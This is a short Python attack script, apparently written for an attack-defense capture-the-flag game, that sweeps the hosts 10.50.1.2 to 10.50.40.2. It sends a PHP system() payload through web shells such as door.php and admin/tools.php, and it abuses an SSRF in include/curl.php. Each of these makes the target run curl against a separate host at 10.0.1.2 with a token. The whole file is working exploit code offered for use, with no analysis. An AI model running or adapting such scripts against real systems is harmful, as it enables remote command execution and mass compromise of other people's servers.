import requests
def atk(dirn,password):
    for i in range(1,41):
        url="http://10.50."+str(i)+".2/"+str(dirn)
        data={password:"system('curl http://10.0.1.2?token=XBXOUUFK')"}
        try:
            r = requests.post(url,data=data,timeout=3)
            if(r.ok):
                #print(str(url)+" : ",r.text)
                print(r.text)
        except:
            pass
def test(dirn):
    for i in range(1,41):
        url="http://10.50."+str(i)+".2/"+str(dirn)
        try:
            r = requests.get(url,timeout=1)
            if(r.ok):
                print(str(i)+" : is running")
        except:
            pass
#atk()
#test("app/app/ueditor/index.html")
#test("door.php")
#atk("admin/tools.php","_")
#atk("door.php","a")
#test("tools.php")
def atkk():
    for i in range(1,41):
        url="http://10.50."+str(i)+".2/include/curl.php?address=http%3A%2F%2F10.0.1.2%3Ftoken%3DXBXOUUFK%26a%3D%2F127.0.0.1%2F"
        try:
            r = requests.get(url,timeout=1)
            if(r.ok):
                print(str(url)+" : ",r.text)
                #print(r.text)
        except:
            pass
atkk()
